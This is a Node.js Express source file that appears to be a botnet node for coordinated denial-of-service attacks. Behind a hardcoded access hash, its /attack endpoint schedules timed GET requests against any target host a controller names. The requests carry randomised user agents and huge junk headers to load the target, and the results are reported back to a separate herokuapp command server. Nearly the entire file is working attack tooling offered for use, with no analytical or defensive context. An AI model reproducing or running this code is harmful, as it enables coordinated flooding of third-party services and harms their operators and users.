var express = require('express');
var path = require('path');

var Req = require('request');

var app = express();

var id;
const lto = 'https://bb-s.herokuapp.com';

app.use(express.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, 'public')));

app.use(function (req,res,next) {
  if(!req.query.hash || req.query.hash !== "1111991")
  {
    res.status(403);
    res.end('your are banned');
    console.log(req.query);
    return;
  }

  console.log(req.body);

  next();
});

app.post('/attack',function (req,res) {
  var time = req.body.time - getNow();
  var host = req.body.host;
  id = req.body.id;

  setTimeout(function () {
    attack(host);
  },time);
  console.log('starting');
  res.end('started');

});



app.use('/', function (req,res) {
  res.end('hi');
});

app.use(function (req,res) {
  res.status(404);
  res.end('Not Found');
});


function getUserAgent() {
  var users = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Safari/535.19',
    'Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19',
    'Mozilla/5.0 (MeeGo; NokiaN9) AppleWebKit/534.13 (KHTML, like Gecko) NokiaBrowser/8.5.0 Mobile Safari/534.13',
    'Mozilla/5.0 (PlayBook; U; RIM Tablet OS 2.1.0; en-US) AppleWebKit/536.2+ (KHTML, like Gecko) Version/7.2.1.0 Safari/536.2+'
  ]

  return users[Math.floor(Math.random() * users.length)];
}


function getH() {
  return ('2467zzasSSSLlKKFKKHKHKGKKK9596999').repeat(100);
}
function attack(host) {
  /*
  var d = new Date(getNow());
    var h = (d.getHours());
    var m = (d.getMinutes());
    var s = (d.getSeconds());
    console.log(`${h}:${m}:${s}`);
    */


var headers = {
'user-agent':getUserAgent(),
'Content-Type':'application/x-www-form-urlencoded',
'referrer':'https://www.google.com/q='+getH(),
'x-cross-1':getH(),
'x-cross-2':getH(),
'x-cross-3':getH(),
'x-cross-4':getH(),
'x-cross-5':getH()
}
    var options = {
      url:host,
      headers:headers
    }
    Req.get(options,function (err, response, body) {
      if (err) {
          console.log(err);
        return;
      }

      if (response.statusCode == '200') Log('success');
      else Log('error: '+ response.statusCode);


    });




}


function Log(txt) {
  txt = id + ' :'+txt;
  console.log(txt);

var pin = '1111991';

  Req.post({
    url:lto+'/reg?hash='+pin,
    form:{
      s:txt,
      id:id
    }
  },
function (err) {

});
}

function getNow() {
  var iraq = new Date().getTime();
  return iraq;
}



module.exports = app;
